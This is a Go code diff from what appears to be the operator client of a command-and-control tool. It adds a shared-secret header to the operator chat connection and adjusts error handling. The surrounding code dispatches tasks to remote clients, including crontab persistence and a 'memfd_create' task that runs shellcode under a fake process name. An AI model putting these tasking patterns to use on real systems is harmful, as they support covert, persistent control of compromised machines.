@@ -105,13 +105,13 @@ func OperatorDoCheckIn(operator *data.Operator) error {
 	}
 	err := operator.Conn.WriteMessage(checkInMessage.ToBytes())
 	if err != nil {
-		return err
+		log.Fatal("Failed to check in: ", err)
 	}
 	go func() {
 		time.Sleep(time.Second * 5)
 		if !OperatorCheckedIn {
 			operator.Conn.WriteMessage(websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
-			log.Fatal(errors.New("Failed to check in. Change your nick. Check Your Server."))
+			log.Fatal(errors.New("Failed to check in. Check your shared secret. Change your nick. Check Your Server."))
 		}
 	}()
 	<-OperatorCheckedInChan
@@ -612,7 +612,7 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 	case "crontab":
 		PrepareTaskWithOneArg(c, clientId, command, "<command>: ")
 	case "memfd_create":
-		PrepareShellcodeTask(c,clientId,command,"<localFile>;<fakeProcessName>: ")
+		PrepareShellcodeTask(c, clientId, command, "<localFile>;<fakeProcessName>: ")
 	default:
 		c.Println("Task not found.")
 	}
@@ -917,15 +917,14 @@ func OperatorChatHandler(connection *data.Connection) {
 func OperatorJoinChat() {
 	socketUrl := fmt.Sprintf("wss://%s:443/operatorChat", ServerHostName)
 	var err error
-	c, _, err := websocket.DefaultDialer.Dial(socketUrl, http.Header{"nick": []string{Operator.OperatorNick}})
+	c, _, err := websocket.DefaultDialer.Dial(socketUrl,
+		http.Header{
+			"nick":          []string{Operator.OperatorNick},
+			"shared-secret": []string{ServerSharedSecret},
+		})
 	Operator.ChatConn = data.NewConnection(c)
 	if err != nil {
 		log.Fatal("Error connecting to Websocket Server:", err)
-	}
-	//message := fmt.Sprintf("[ %s ] <_%s_>: Joined The Server.", time.Now().Format(time.RFC1123), Operator.OperatorNick)
-	//err = Operator.ChatConn.WriteMessage([]byte(message))
-	if err != nil {
-		log.Fatal(err)
 	}
 	go OperatorChatHandler(Operator.ChatConn)
 }
